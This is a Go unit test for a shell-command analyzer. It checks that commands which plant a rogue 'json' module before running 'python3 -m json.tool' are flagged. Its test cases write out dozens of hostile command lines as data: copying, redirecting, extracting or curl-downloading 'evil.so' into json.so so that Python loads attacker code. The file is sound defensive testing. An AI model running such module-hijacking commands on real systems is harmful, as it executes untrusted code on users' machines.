package shellir

import (
	"os"
	"path/filepath"
	"testing"
)

// TestPythonModuleJSONToolWrites (CRW-894, fix round 2: the verifier of 5d41d266): python -m json.tool imports json from the
// working directory first, so a json module the same text writes is what runs: a compiled extension (json.so, json.*.so,
// json/__init__.*), a copy tree that fills json or the directory, a redirection (also through a symbolic link to the
// directory), and any program whose writes the reader does not model. Commands that create no file but through their
// redirections, with redirections to names that are no json module, stay read.
func TestPythonModuleJSONToolWrites(t *testing.T) {
	const j = "printf '{}' | python3 -m json.tool"
	for _, c := range []struct {
		cmd        string
		unreadable bool
	}{
		{"cp evil.so json.so; " + j, true},
		{"cp evil.so json/__init__.so; " + j, true},
		{"cp evil.so json.cpython-312-x86_64-linux-gnu.so; " + j, true},
		{"cp evil.so json.abi3.so; " + j, true},
		{"cp evil.pyd json.pyd; " + j, true},
		{"cat evil.so > json.so; " + j, true},
		{"cat evil.so >> json.so; " + j, true},
		{"cat evil.so >| json.so; " + j, true},
		{"cat evil.so &> json.so; " + j, true},
		{"cat evil.so >& json.so; " + j, true},
		{"cat evil.so 1<> json.so; " + j, true},
		{"cat evil.so > json/__init__.cpython-312-x86_64-linux-gnu.so; " + j, true},
		{"cat evil.so > ./json/../json.so; " + j, true},
		{"cat evil.so | tee json.so; " + j, true},
		{"cp -r pkg json; " + j, true},
		{"cp -r pkg/. .; " + j, true},
		{"mv evil.so json.so; " + j, true},
		{"install evil.so json.so; " + j, true},
		{"ln -s evil.so json.so; " + j, true},
		{"for i in 1 2; do " + j + "; cp evil.so json.so; done", true},
		{j + " & cp evil.so json.so; wait", true},
		{"tar xf evil.tar; " + j, true},
		{"unzip -o evil.zip; " + j, true},
		{"python3 -c \"import shutil; shutil.copy('evil.so', 'json.so')\"; " + j, true},
		{"curl -so json.so https://example.invalid/x; " + j, true},
		{"dd if=evil.so of=json.so; " + j, true},
		{"cp evil.so \"$N\"; " + j, true},
		{"bash -c 'cp evil.so json.so'; " + j, true},
		{"cat evil.so > json.so & " + j, true},
		{"cat evil.so > \"$N\"; " + j, true},
		{"(cd \"$D\"; cat evil.so > json.so); " + j, true},
		{"f() { cat evil.so > json.so; }; f; " + j, true},
		{"source env.sh; " + j, true},
		{j + " > json.so", true},
		// controls
		{j, false},
		{"grep '\"pr\": *737' alerts.jsonl | tail -1 | python3 -m json.tool | head -80", false},
		{"cat in.json | python3 -m json.tool > out.json", false},
		{"echo '{}' | python3 -m json.tool 2>&1 | head -5", false},
		{"echo '{}' > in.json; python3 -m json.tool < in.json", false},
		{"cd sub && " + j, false},
		{"(cd \"$D\"; cat evil.so > out.txt); " + j, false},
		{j + "; " + j + " --sort-keys", false},
		{"X=1; " + j, false},
	} {
		dir := t.TempDir()
		if err := os.Mkdir(filepath.Join(dir, "sub"), 0o755); err != nil {
			t.Fatal(err)
		}
		_, err := Analyze(c.cmd, dir)
		if got := err != nil; got != c.unreadable {
			t.Errorf("%q: unreadable=%v, want %v (%v)", c.cmd, got, c.unreadable, err)
		}
	}
	// a redirection through a symbolic link that names the working directory writes its json.so
	dir := t.TempDir()
	if err := os.Symlink(".", filepath.Join(dir, "sub")); err != nil {
		t.Fatal(err)
	}
	if _, err := Analyze("cat evil.so > sub/json.so; "+j, dir); err == nil {
		t.Error("a redirection to json.so through a link to the working directory is read")
	}
	if _, err := Analyze("cat evil.so > sub/out.txt; "+j, dir); err != nil {
		t.Errorf("a redirection to out.txt through a link is refused: %v", err)
	}
	// the reading with no directory leaves the judgment to the readings that have one
	if _, err := AnalyzeNoDir("cp evil.so json.so; " + j); err != nil {
		t.Errorf("AnalyzeNoDir refuses the copy before json.tool: %v", err)
	}
}
